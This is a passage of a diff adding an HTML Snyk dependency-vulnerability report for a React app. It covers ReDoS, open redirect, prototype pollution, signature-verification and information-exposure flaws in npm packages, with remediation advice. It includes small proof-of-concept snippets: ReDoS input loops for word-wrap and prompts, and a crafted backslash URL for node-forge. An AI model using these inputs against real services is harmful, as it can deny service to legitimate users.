+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jest@26.6.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @jest/core@26.6.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jest-config@26.6.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jest-environment-jsdom@26.6.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jsdom@16.7.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        escodegen@2.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        optionator@0.8.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        word-wrap@1.2.3
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the <code>result</code> variable.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code class="language-js">const wrap = require(&quot;word-wrap&quot;);
+        
+        for (let i = 0; i &lt;= 10; i++) {
+        const attack = &quot;a&quot; + &quot;t&quot;.repeat(i * 10_00000);
+        const start = performance.now();
+        wrap(
+        attack,
+        { trim: true },
+        );
+        console.log(`${attack.length} characters: ${performance.now() - start}ms`);
+        }
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>There is no fixed version for <code>word-wrap</code>.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/jonschlinkert/word-wrap/blob/master/index.js#L39">Vulnerable Code</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-WORDWRAP-3149973">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            prompts
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        prompts@2.4.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        prompts@2.4.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jest@26.6.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jest-cli@26.6.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        prompts@2.4.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker that is able to provide a crafted input to the strip functionality may cause an application to consume an excessive amount of CPU.</p>
+        <p><strong>Note:</strong> CVE-2021-3868 was previously assigned to this vulnerability and retracted.</p>
+        <h3 id="poc">PoC</h3>
+        <pre><code>const strip = require(&#39;prompts/lib/util/strip.js&#39;);
+        for(var i = 1; i &lt;= 5000; i++) {
+        var time = Date.now();
+        var attack_str = &quot;\u001B[&quot;+&quot;;&quot;.repeat(i*1000);
+        strip(attack_str)
+        var time_cost = Date.now() - time;
+        console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)
+        }
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>prompts</code> to version 2.4.2 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/terkelg/prompts/pull/333">GitHub PR</a></li>
+        <li><a href="https://github.com/terkelg/prompts/releases/tag/v2.4.2">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-PROMPTS-1729737">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Open Redirect</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-forge
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack-dev-server@3.11.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        selfsigned@1.10.14
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-forge@0.10.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/digitalbazaar/forge">node-forge</a> is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.
+        Affected versions of this package are vulnerable to Open Redirect via <code>parseUrl</code> function when it mishandles certain uses of backslash such as <code>https:/\/\/\</code> and interprets the URI as a relative path.</p>
+        <h3 id="poc">PoC:</h3>
+        <pre><code class="language-js">
+        // poc.js
+        var forge = require(&quot;node-forge&quot;);
+        var url = forge.util.parseUrl(&quot;https:/\/\/\www.github.com/foo/bar&quot;);
+        console.log(url);
+        
+        // Output of node poc.js:
+        
+        {
+          full: &#39;https://&#39;,
+          scheme: &#39;https&#39;,
+          host: &#39;&#39;,
+          port: 443,
+          path: &#39;/www.github.com/foo/bar&#39;,                        &lt;&lt;&lt;---- path  should be &quot;/foo/bar&quot;
+          fullHost: &#39;&#39;
+        }
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-forge</code> to version 1.0.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/digitalbazaar/forge/commit/db8016c805371e72b06d8e2edfe0ace0df934a5e">GitHub Commit</a></li>
+        <li><a href="https://snyk.io/blog/url-confusion-vulnerabilities/">URL Confusion Explained - Snyk Blog</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFORGE-2330875">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-forge
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack-dev-server@3.11.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        selfsigned@1.10.14
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-forge@0.10.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/digitalbazaar/forge">node-forge</a> is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.
+        Affected versions of this package are vulnerable to Prototype Pollution via the <code>forge.debug</code> API if called with untrusted input.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>__proto__</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>__proto__.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        <li><p>Web browser</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-forge</code> to version 1.0.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/digitalbazaar/forge/commit/51228083550dde97701ac8e06c629a5184117562">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFORGE-2331908">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Improper Verification of Cryptographic Signature</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-forge
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack-dev-server@3.11.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        selfsigned@1.10.14
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-forge@0.10.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/digitalbazaar/forge">node-forge</a> is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.
+        Affected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to RSA&#39;s <code>PKCS#1 v1.5</code> signature verification code which does not properly check <code>DigestInfo</code> for a proper <code>ASN.1</code> structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-forge</code> to version 1.3.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFORGE-2430337">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Improper Verification of Cryptographic Signature</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-forge
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack-dev-server@3.11.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        selfsigned@1.10.14
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-forge@0.10.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/digitalbazaar/forge">node-forge</a> is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.
+        Affected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to RSA<code>s </code>PKCS#1` v1.5 signature verification code which is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-forge</code> to version 1.3.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFORGE-2430341">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Information Exposure</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-fetch
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, mdbreact@5.2.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        mdbreact@5.2.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @material-ui/core@3.9.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        recompose@0.30.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        fbjs@0.8.18
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        isomorphic-fetch@2.2.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-fetch@1.7.3
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/node-fetch">node-fetch</a> is a light-weight module that brings window.fetch to node.js
+        Affected versions of this package are vulnerable to Information Exposure when fetching a remote url with Cookie, if it get a <code>Location</code> response header, it will follow that url and try to fetch that url with provided cookie. This can lead to forwarding secure headers to 3th party.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-fetch</code> to version 2.6.7, 3.1.1 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/node-fetch/node-fetch/commit/1ef4b560a17e644a02a3bfdea7631ffeee578b35">Github Commit</a></li>
+        <li><a href="https://github.com/node-fetch/node-fetch/commit/36e47e8a6406185921e4985dcbeff140d73eaa10">GitHub Commit</a></li>
+        <li><a href="https://github.com/node-fetch/node-fetch/pull/1449/commits/5c32f002fdd65b1c6a8f1e3620210813d45c7e60">GitHub Commit</a></li>
+        <li><a href="https://github.com/node-fetch/node-fetch/pull/1449">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFETCH-2342118">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
